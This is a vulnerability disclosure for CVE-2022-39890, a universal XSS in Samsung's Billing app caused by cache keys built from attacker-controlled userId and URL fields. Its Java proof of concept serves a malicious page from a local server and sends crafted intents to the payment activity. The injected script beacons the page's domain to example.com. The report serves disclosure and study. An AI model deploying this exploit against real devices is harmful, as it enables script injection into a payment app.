# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Billing</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.android.app.billing</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.28</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.11.08</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39890">CVE-2022-39890</a> (SVE-2022-0776)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$980</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/025.%20Samsung%20Billing%20—%20Universal-XSS/Oversecured_report.png)

Oversecured found a vulnerability for insecure web page caching within the app. It created a cache key by concatenating the `userId` field and the URL value. An attacker could control both of these fields.

**Proof of Concept**

The exploit works by first requiring the user to click on the `FIRST LAUNCH` button in the attacker's app and to cache the attacker's malicious page that we created on the local web server. The key for that page would be `1http://127.0.0.1:8888/#https://google.com/`.

During the second run, we have to click on `SECOND LAUNCH`. The domain `https://google.com/` will already be open, but because the `userId` is equal to `1http://127.0.0.1:8888/#`, the page keys will match, so the cached malicious page will be opened.

```java
private WebServer webServer = new WebServer() {
    @Override
    protected void printHeaders(PrintWriter printWriter, String path, Map<String, String> queryParams) {
        printHeader(printWriter, "Content-Type", "text/html");
    }

    @Override
    protected void printBody(PrintWriter printWriter, String path, Map<String, String> queryParams) {
        printWriter.println("<h1>Evil</h1>");
        printWriter.println("<script>" +
                "window.android = {};" +
                "window.android.purchaseConfirmPasswordResult = function(x){};" +
                "window.android.handleCachedResult = function(x){};" +
                "window.android.jsAndroidEvent = function(x,y){};" +
                "</script>");
        printWriter.println("<script>" +
                "new Image().src = 'http://example.com?domain=' + document.domain;" +
                "</script>");
    }
};

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main_activity);

    webServer.start(8888);

    findViewById(R.id.button).setOnClickListener((view) -> {
        launchWithData("1", "http://127.0.0.1:8888/#https://google.com/");
    });
    findViewById(R.id.button2).setOnClickListener((view) -> {
        launchWithData("1http://127.0.0.1:8888/#","https://google.com/");
    });
}

private void launchWithData(String userId, String url) {
    final String dummyString = "1";

    DeviceInfo deviceInfo = new DeviceInfo();
    deviceInfo.setDeviceUID(dummyString);

    PaymentInfo paymentInfo = new PaymentInfo();
    paymentInfo.setPaymentType(dummyString);

    ProductDetailInfo productDetailInfo = new ProductDetailInfo();
    productDetailInfo.setAmount(dummyString);
    productDetailInfo.setProductID(dummyString);
    productDetailInfo.setProductName(dummyString);

    ServiceStoreInfo serviceStoreInfo = new ServiceStoreInfo();
    serviceStoreInfo.setCountry(dummyString);

    ProductInfo productInfo = new ProductInfo();
    productInfo.setCurrency(dummyString);
    productInfo.setTotalAmount(dummyString);
    productInfo.setDetailProductInfos(new ProductDetailInfo[]{productDetailInfo});

    SignatureInfo signatureInfo = new SignatureInfo();
    signatureInfo.setBaseString(dummyString);
    signatureInfo.setSignature(dummyString);
    signatureInfo.setTimeStamp(dummyString);

    UserInfo userInfo = new UserInfo();
    userInfo.setAccessToken("GuestCheckout");
    userInfo.setUserEmail(dummyString);
    userInfo.setUserID(userId);

    UnifiedPaymentServerInfo serverInfo = new UnifiedPaymentServerInfo();
    serverInfo.setUpServerURL(url);

    UnifiedPaymentInfo info = new UnifiedPaymentInfo();
    info.setAppServiceID(dummyString);
    info.setStoreRequestID(dummyString);
    info.setDeviceInfo(deviceInfo);
    info.setPaymentInfo(paymentInfo);
    info.setProductInfo(productInfo);
    info.setServiceStoreInfo(serviceStoreInfo);
    info.setSignatureInfo(signatureInfo);
    info.setUserInfo(userInfo);
    info.setBillingServerInfo(serverInfo);

    Intent i = new Intent();
    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    i.setClassName("com.sec.android.app.billing", "com.sec.android.app.billing.unifiedpayment.activity.PaymentActivity");
    i.putExtra("NEW_SDK", true);
    i.putExtra("PACKAGE_NAME", getPackageName());
    i.putExtra("BILLING_DATA", new Gson().toJson(info));
    startActivity(i);
}
```

The exploit sends a request where it specifies the current origin:
```js
new Image().src = 'http://example.com?domain=' + document.domain;
```

The result will be as follows:
![](04%20رئيسية/Samsung%20Vulnerabilities/025.%20Samsung%20Billing%20—%20Universal-XSS/Result.png)

## References

- [Oversecured Blog. Android security checklist: WebView](https://blog.oversecured.com/Android-security-checklist-webview/)
